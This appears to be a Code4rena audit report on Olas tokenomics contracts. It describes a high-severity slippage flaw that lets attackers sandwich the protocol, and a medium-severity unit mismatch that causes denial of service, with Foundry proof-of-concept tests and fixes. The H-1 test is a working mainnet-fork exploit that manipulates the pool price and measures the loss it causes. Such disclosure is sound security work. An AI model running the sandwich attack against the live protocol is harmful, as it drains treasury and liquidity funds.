# [Olas Report](https://code4rena.com/audits/2026-01-olas)

| ID | Title |
|:--:|:---|
| [H-1](#h-1-slippage-calculated-on-manipulated-spot-price-allows-losses-within-oracle-limits) | Slippage calculated on manipulated spot price allows losses within oracle limits |
| [M-1](#m-1-slippage-unit-mismatch-across-contracts-causes-permanent-dos-for-v2-liquidity-migration-and-buybackburner) | Slippage unit mismatch across contracts causes permanent DoS for V2 liquidity migration and BuybackBurner |

# [H-1] Slippage calculated on manipulated spot price allows losses within oracle limits
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/pol/LiquidityManagerCore.sol#L338-L365
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/pol/LiquidityManagerCore.sol#L385-L414
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/utils/BuyBackBurner.sol#L231-L234

## Finding description

> Note: This report supplements my previous submission **`Slippage calculated on manipulated spot price allows losses within oracle limits`** by adding a missed instance, making the finding more complete and comprehensive.

The protocol uses `checkPoolAndGetCenterPrice()` as a security mechanism to ensure the current V3 pool price does not deviate from the TWAP by more than `MAX_ALLOWED_DEVIATION` (10%).
After this check passes, multiple contracts proceed to execute transactions (removing liquidity or swapping) based on the current spot price (`slot0`) rather than the validated `TWAP`. This allows an attacker to manipulate the spot price up to the edge of the allowed deviation (~9.9%) and sandwich the protocol's transaction, causing losses significantly higher than the owner's configured slippage tolerance.
1. Instance 1: `LiquidityManagerCore` (`_decreaseLiquidity()` & `_increaseLiquidity()`)
```solidity
    function decreaseLiquidity(...) {
        //...
        checkPoolAndGetCenterPrice(pool); // 1. Loose check: is Spot within 10% of TWAP?

        (liquidity,) = _decreaseLiquidity(pool, positionId, decreaseRate); // 2. Execution uses Spot Price
        // ...
```
In `_decreaseLiquidity()`, the contract redundantly re-fetches the spot price after the oracle check and uses it to calculate `amountMin`, instead of using the oracle-validated fair price (TWAP). This means the slippage check is ultimately enforced against a manipulable spot price, not the intended fair price.
```solidity
    function _decreaseLiquidity(...) {
        // ...
        // redundantly fetches the instantaneous spot price (slot0), which might be manipulated by up to 9.9%
        (uint160 sqrtPriceX96,) = _getPriceAndObservationIndexFromSlot0(pool);
        // Check for zero value
        if (sqrtPriceX96 == 0) {
            revert ZeroValue();
        }
        // ...
        // calculates amounts based on the manipulated Spot Price
        uint256[] memory amountsMin = new uint256[](2);
        (amountsMin[0], amountsMin[1]) =
            LiquidityAmounts.getAmountsForLiquidity(sqrtPriceX96, sqrtAB[0], sqrtAB[1], liquidity);

        // applies slippage to the manipulated price
        amountsMin[0] = amountsMin[0] * (MAX_BPS - maxSlippage) / MAX_BPS;
        amountsMin[1] = amountsMin[1] * (MAX_BPS - maxSlippage) / MAX_BPS;
        //...
```
### Scenario Example:
- Fair Price (TWAP): 100. 
- Attacker moves price to 91 (9% deviation, passes 10% oracle check).
- Protocol calculates `amountMin` based on 91. With 1% slippage, `min = 90.09`.
- Owner receives ~90.09, suffering a ~10% loss, despite setting a 1% slippage tolerance.

2. Instance 2: The same vulnerability exists in `BuyBackBurner._buyOLAS` (V3 variant). The function calls `checkPoolAndGetCenterPrice(pool)` to validate the pool state but then immediately executes `_performSwap()`.
```solidity
function _buyOLAS(...) {
    //...
    ILiquidityManager(liquidityManager).checkPoolAndGetCenterPrice(pool);
    olasAmount = _performSwap(secondToken, secondTokenAmount, feeTierOrTickSpacing);
}
```
`_performSwap()` relies on the checks of `checkPoolAndGetCenterPrice()` while setting `amountOutMinimum` to a hardcoded value of `1`
```solidity
function _performSwap(...){
    //...
    IRouterV3.ExactInputSingleParams memory params = IRouterV3.ExactInputSingleParams({
        tokenIn: token,
        tokenOut: olas,
        fee: uint24(feeTier),
        recipient: address(this),
        amountIn: tokenAmount,
        amountOutMinimum: 1,
        sqrtPriceLimitX96: 0
```

> Note that `checkPoolAndGetCenterPrice()` has a separate variable shadowing issue that can fully bypass oracle validation and has already been reported [V12 finding](https://github.com/code-423n4/2026-01-olas/blob/main/code_423n4_autonolas_v12_tokenomics_v2__main_bbec5ac_findings_2026-01-23-findings.md#oracletwap-integrity-failures--math-state-ordering-unit-mismatches-and-trust-assumptions-allow-price-manipulation-and-twap-guard-bypass).
> However, this finding is independent of that issue. Even if oracle validation is fixed and strictly enforces the 10% deviation limit, this vulnerability remains exploitable because it operates entirely within the protocol’s intended deviation bounds.

## Impact
- Liquidity Manager: Owner suffer immediate value loss (up to ~10%) when increasing or decreasing liquidity, even when specifying strict slippage limits.
- BuyBackBurner: The protocol's buyback mechanism is inefficient. Treasury funds are extracted by MEV/sandwich bots via price manipulation, resulting in fewer OLAS tokens being bought and burned than intended.

## Recommended mitigation steps
The contracts should capture the validated `TWAP` from `checkPoolAndGetCenterPrice()` and use it to calculate the expected output/minimums.

Fix for `LiquidityManagerCore`:
Pass the validated `sqrtPriceX96` (TWAP) into the internal functions instead of re-fetching slot0.
```diff
-   checkPoolAndGetCenterPrice(pool);
-   (liquidity,) = _decreaseLiquidity(pool, positionId, decreaseRate);
+   (uint160 fairSqrtPriceX96,) = checkPoolAndGetCenterPrice(pool);
+   (liquidity,) = _decreaseLiquidity(pool, positionId, decreaseRate, fairSqrtPriceX96);
```

Fix for `BuyBackBurner`:
Calculate `amountOutMinimum` using the TWAP and pass it to the swap execution.
```diff
-   ILiquidityManager(liquidityManager).checkPoolAndGetCenterPrice(pool);
-   olasAmount = _performSwap(secondToken, secondTokenAmount, feeTierOrTickSpacing);
+   (uint160 fairSqrtPriceX96,) = ILiquidityManager(liquidityManager).checkPoolAndGetCenterPrice(pool);
+   uint256 fairAmountOut = ...; // Use LiquidityAmounts or Oracle library
+   uint256 minAmountOut = fairAmountOut * (MAX_BPS - maxSlippage) / MAX_BPS;
+   olasAmount = _performSwap(..., minAmountOut);
```

## POC
The following test demonstrates a scenario where owner configures a strict 1% (100 BPS) slippage tolerance. An attacker manipulates the price by ~9%. Result: The transaction succeeds, and owner suffers a loss of 17.14 ETH, which is ~10x higher than the configured tolerance (1.78 ETH).
Usage:
1. Configure an Ethereum RPC endpoint in `foundry.toml`:
```toml
[rpc_endpoints]
eth_rpc_url = "YOUR_RPC_URL"
``` 
1. Copy the test below into `autonolas-tokenomics/test/`, then run `forge test --mt test_PoC_SlippageFailure -vv`. 
> A fixed fork block is used to ensure deterministic oracle state and reproducibility. 
```solidity
import {Test, console} from "forge-std/Test.sol";
import {BaseSetup} from "./LiquidityManagerETH.t.sol"; 
import {IToken} from "../contracts/interfaces/IToken.sol";
import {IUniswapV3} from "../contracts/interfaces/IUniswapV3.sol";
import {LiquidityManagerETH} from "../contracts/pol/LiquidityManagerETH.sol";

interface IFactory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract LiquidityManagerPoC is BaseSetup {

    uint256 forkBlockNumber = 24345119;

    function setUp() public override {
        // Create and select a mainnet fork environment to ensure consistent state
        vm.createSelectFork(vm.rpcUrl("eth_rpc_url"), forkBlockNumber);
        super.setUp();
        vm.prank(liquidityManager.owner());
        liquidityManager.changeMaxSlippage(100); // reconfigure max slippage to 1% (100 BPS)
    }

    function test_PoC_SlippageFailure() public {
        // 1. Initial Setup: Owner establishes a normal V3 position
        int24[] memory tickShifts = new int24[](2);
        tickShifts[0] = -27000;
        tickShifts[1] = 17000;
        uint16 olasBurnRate = 0;
        bool scan = true;

        liquidityManager.convertToV3(
            TOKENS, PAIR_V2_BYTES32, FEE_TIER, tickShifts, olasBurnRate, scan
        );
        address pool = IFactory(FACTORY_V3).getPool(TOKENS[0], TOKENS[1], uint24(FEE_TIER));
        
        IUniswapV3(pool).increaseObservationCardinalityNext(100); // Increase Oracle cardinality to ensure checkPoolAndGetCenterPrice works correctly
        vm.warp(block.timestamp + 3600); // Advance time to populate the Oracle and establish a valid TWAP baseline
        IUniswapV3(pool).observe(new uint32[](1)); 

        // Record the fair spot price before the attack
        (uint160 sqrtP_Fair, , , , , , ) = IUniswapV3(pool).slot0(); 
        console.log("Before Attack Fair SqrtPrice:", sqrtP_Fair);

        // 2. The Attack: Attacker executes a large swap to manipulate the price (OLAS -> WETH)
        address attacker = address(0xBAD);
        uint256 swapAmount = 1_800_000e18;
        deal(OLAS, attacker, swapAmount);
        
        vm.startPrank(attacker);
        IToken(OLAS).approve(ROUTER_V3, swapAmount);
        
        IRouterV3.ExactInputSingleParams memory params = IRouterV3.ExactInputSingleParams({
            tokenIn: OLAS,
            tokenOut: WETH,
            fee: uint24(FEE_TIER),
            recipient: attacker,
            amountIn: swapAmount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        IRouterV3(ROUTER_V3).exactInputSingle(params);
        vm.stopPrank();

        // Verify the price manipulation
        (uint160 sqrtP_Manipulated, , , , , , ) = IUniswapV3(pool).slot0();
        // Calculate the actual price drop in BPS
        uint256 ratioX18 = uint256(sqrtP_Manipulated) * 1e18 / uint256(sqrtP_Fair);
        uint256 priceRatio = ratioX18 * ratioX18 / 1e18; 
        uint256 dropBPS = 10000 - (priceRatio * 10000 / 1e18); 

        console.log("After Attack Manipulated SqrtPrice:", sqrtP_Manipulated);
        console.log("Calculated Price Drop:", dropBPS/100, "%");
        require(sqrtP_Manipulated < sqrtP_Fair, "Price should decrease");

        // 3. Owner Action: Execute decreaseLiquidity (removing 50%)
        uint16 decreaseRate = 5000; 
        
        // Record WETH balance before execution
        uint256 balanceWethBefore = IToken(WETH).balanceOf(TIMELOCK);

        // Expectation: This should REVERT because the price drop (approx 9%) > maxSlippage (1%).
        // If this does not revert, the vulnerability is confirmed.
        liquidityManager.decreaseLiquidity(TOKENS, FEE_TIER, decreaseRate, 0);

        uint256 balanceWethAfter = IToken(WETH).balanceOf(TIMELOCK);
        uint256 wethReceived = balanceWethAfter - balanceWethBefore; // actual amount received
        uint256 expectedFairWeth = wethReceived * 10000 / (10000 - dropBPS); // the amount expected if sold at Fair Price
        uint256 loss = expectedFairWeth - wethReceived; // the actual loss value
        uint256 maxAllowedLoss = expectedFairWeth * 100 / 10000; // the maximum loss the user agreed to tolerate (1%)

        console.log("WETH Received:", wethReceived);
        console.log("WETH Expected (Fair):    ", expectedFairWeth);
        console.log("Actual Loss Value:       ", loss);
        console.log("Max User-Allowed Loss:   ", maxAllowedLoss);
        require(loss > maxAllowedLoss, "PoC Failed: User was protected or loss within limits");
    }
}
```

# [M-1] Slippage unit mismatch across contracts causes permanent DoS for V2 liquidity migration and BuybackBurner
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/pol/LiquidityManagerETH.sol#L170
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/oracles/UniswapPriceOracle.sol#L86-L90
https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/utils/BuyBackBurner.sol#L185-L200
## Finding description

> Note: This report supplements my previous submission **`Slippage unit mismatch across contracts causes permanent DoS for V2 liquidity migration`** by adding a missed instance, making the finding more complete and comprehensive.

Both `LiquidityManagerETH._checkTokensAndRemoveLiquidityV2()` and `BuyBackBurner._buyOLAS()` rely on `UniswapPriceOracle.validatePrice()` for slippage protection. However, both contracts pass slippage parameters that are magnitudes smaller ($10^{14}$ times smaller) than what the oracle expects. This causes the slippage check to fail under even the tiniest normal market volatility, resulting in a DoS.

1. Instance 1: In `_checkTokensAndRemoveLiquidityV2()`, the oracle is called as follows:
```solidity
if (!IOracle(oracleV2).validatePrice(maxSlippage / 100)) {
    revert SlippageLimitBreached();
}
```
- `maxSlippage` is a `uint16` in BPS (Basis Points). For example, 5% slippage is 500.
- The code divides this by 100, resulting in a small integer (e.g., `500 / 100 = 5`).
- Additionally, due to integer division, any slippage setting below 1% (e.g., 0.5% or 50 BPS) rounds down to 0, requiring a technically impossible 0% deviation.

2. Instance 2: In `_buyOLAS()` (V2 variant):
```solidity
// Line A: Passes raw maxSlippage to Oracle
require(IOracle(poolOracle).validatePrice(maxSlippage), "...");

// Line B: Hardcoded percentage math enforces maxSlippage <= 100
uint256 lowerBound = (previousPrice * (100 - maxSlippage)) / 100;
```
- To satisfy the Oracle (Line A), `maxSlippage` must be huge (e.g., 5e14 for 5%).
- To satisfy the internal math (Line B), `maxSlippage` must be $\le 100$.

In `validatePrice()`, the oracle calculates the real price deviation (`derivation`) using this formula:
```solidity
uint256 derivation = (tradePrice > timeWeightedAverage)
    ? ((tradePrice - timeWeightedAverage) * 1e16) / timeWeightedAverage
    : ((timeWeightedAverage - tradePrice) * 1e16) / timeWeightedAverage;

return derivation <= slippage;
```
- The `derivation` is scaled by `1e16`. Here, `1e16` represents a 100% deviation.
- Even a tiny, standard market fluctuation of 0.01% (1 BPS) results in a `derivation` value of `1e12`.

The final check compares a massive `derivation` value against a tiny `slippage` integer.
For example, if the owner allows 5% slippage (`maxSlippage = 500`) and the market moves by just 0.01%: The check becomes: `1,000,000,000,000 <= 5`. This returns `false`. Consequently, as long as there is any non-zero price movement, `validatePrice()` fails.

> Note: This bug is currently masked because the `validatePrice()` function in the Oracle contract contains a separate mathematical error [(identified by the automated bot V12)](https://github.com/code-423n4/2026-01-olas/blob/main/code_423n4_autonolas_v12_tokenomics_v2__main_bbec5ac_findings_2026-01-23-findings.md#oracletwap-integrity-failures--math-state-ordering-unit-mismatches-and-trust-assumptions-allow-price-manipulation-and-twap-guard-bypass) where TWAP is calculated incorrectly to equal the Spot Price, resulting in a deviation of always 0. Once that Oracle math bug is fixed, this unit mismatch DoS will immediately trigger.

## Impact
Permanent Denial of Service: 
1. The `convertToV3()` function is the critical path for migrating V2 liquidity to V3. Due to this unit mismatch, the feature is completely unusable in `LiquidityManagerETH`. Every call will revert with `SlippageLimitBreached`.
2. The `buyBack()` function in BuyBackBurner is unusable for Uniswap V2 pairs. Since Uniswap V2 is the primary liquidity source on Ethereum Mainnet for OLAS, this breaks the protocol's core deflationary mechanism.

## Recommended mitigation steps
The Oracle's `derivation` uses `1e16` as its 100% baseline. The input parameters must be scaled to match this units.
Fix for `LiquidityManagerETH.sol`:
Convert BPS (10,000 basis) to 1e16 basis.
```solidity
// LiquidityManagerETH._checkTokensAndRemoveLiquidityV2()
uint256 scaledSlippage = uint256(maxSlippage) * 1e12;

if (!IOracle(oracleV2).validatePrice(scaledSlippage)) {
    revert SlippageLimitBreached();
}
```
Fix for `BuyBackBurner.sol`:
Convert Percentage (100 basis) to 1e16 basis.
```solidity
uint256 scaledSlippage = uint256(maxSlippage) * 1e14;
require(IOracle(poolOracle).validatePrice(scaledSlippage), "...");
```

## POC
The following test first fixes the known math bug in `validatePrice()` to simulate a correctly functioning Oracle. It then simulates a very stable market (Spot price vs TWAP difference of only 0.01%). The transaction reverts due to the unit mismatch despite the owner setting a high slippage tolerance.
Usage:
1. Configure an Ethereum RPC endpoint in `foundry.toml`:
```toml
[rpc_endpoints]
eth_rpc_url = "YOUR_RPC_URL"
``` 
2. Copy the test below into `autonolas-tokenomics/test/`, then run `forge test --mt test_DoS_DueTo_UnitMismatch -vv`. 
```solidity
import {Test, console} from "forge-std/Test.sol";
import {BaseSetup} from "./LiquidityManagerETH.t.sol"; 
import {IUniswapV3} from "../contracts/interfaces/IUniswapV3.sol";
import {LiquidityManagerETH} from "../contracts/pol/LiquidityManagerETH.sol";
import {LiquidityManagerProxy} from "../contracts/proxies/LiquidityManagerProxy.sol";

contract FixedUniswapPriceOracle {
    // A fixed version of validatePrice with corrected logic
    // The original contract incorrectly uses `cumulativePriceLast + (tradePrice * elapsedTime)`, 
    // causing TWAP to equal the spot price, resulting in a constant zero deviation.
    function validatePrice(uint256 slippage) external view returns (bool) {
        // We simulate a deviation value calculated by a **CORRECT** TWAP implementation.
        // Assumption:  1. The market is extremely stable.
        //              2. The difference between Spot and TWAP is negligible: 0.01% (1 Basis Point).
        // This is a safe state that should pass slippage checks in any functioning DeFi environment.

        // According to UniswapPriceOracle definition: 100% deviation = 1e16
        // Therefore: 0.01% (1 BPS) = 1e16 / 10000 = 1e12
        uint256 correctDerivation = 1e12; 

        console.log("[FixedOracle] Real Market Deviation (0.01%):", correctDerivation);
        console.log("[FixedOracle] Slippage Input from Manager:  ", slippage);   

        // The comparison fails because 1e12 (Oracle scale) > 10 (Manager scale), causing DoS.
        return correctDerivation <= slippage;
    }
}

contract LiquidityManagerUnitMismatchPoC is BaseSetup {
    
    FixedUniswapPriceOracle internal fixedOracle;
    LiquidityManagerETH internal managerWithFixedOracle;
    uint256 forkBlockNumber = 24345119;

    function setUp() public override {
        vm.createSelectFork(vm.rpcUrl("eth_rpc_url"), forkBlockNumber);
        super.setUp();

        // Deploy the fixed Oracle
        fixedOracle = new FixedUniswapPriceOracle(); 

        // Redeploy LiquidityManagerETH, pointing oracleV2 to the FixedOracle
        LiquidityManagerETH impl = new LiquidityManagerETH(
            OLAS,
            TIMELOCK,
            POSITION_MANAGER_V3,
            address(neighborhoodScanner),
            observationCardinality,
            address(fixedOracle), // Inject the fixed Oracle
            ROUTER_V2
        );

        // Deploy Proxy
        bytes memory initPayload = abi.encodeWithSignature("initialize(uint16)", maxSlippage); 
        LiquidityManagerProxy proxy = new LiquidityManagerProxy(address(impl), initPayload);

        // Update manager instance
        managerWithFixedOracle = LiquidityManagerETH(address(proxy));

        // Send V2 LP Tokens to the new Manager to simulate holding user liquidity for migration
        deal(PAIR_V2, address(managerWithFixedOracle), 100 ether);
        
        // Mock token0/token1 calls for the V2 LP Token to prevent reverts during token checks.
        // (We don't need actual V2 Router interaction for this PoC; we only need to trigger validatePrice)
        vm.mockCall(PAIR_V2, abi.encodeWithSignature("token0()"), abi.encode(OLAS));
        vm.mockCall(PAIR_V2, abi.encodeWithSignature("token1()"), abi.encode(WETH));
    }

    function test_DoS_DueTo_UnitMismatch() public {
        // 1. Set a loose slippage tolerance: 10% (1000 BPS)
        uint16 userSlippageBPS = 1000;
        managerWithFixedOracle.changeMaxSlippage(userSlippageBPS);

        // 2. Prepare convertToV3 parameters
        int24[] memory tickShifts = new int24[](2);
        tickShifts[0] = -27000;
        tickShifts[1] = 17000;
        
        // 3. Execute migration
        // Expectation: Revert. 
        // Reason: The deviation in Oracle (1e12) is vastly larger than the value passed by Manager (10).
        vm.expectRevert(bytes("SlippageLimitBreached()"));
        managerWithFixedOracle.convertToV3(
            TOKENS,
            PAIR_V2_BYTES32, 
            FEE_TIER,
            tickShifts,
            0,
            false 
        );
    }
}
```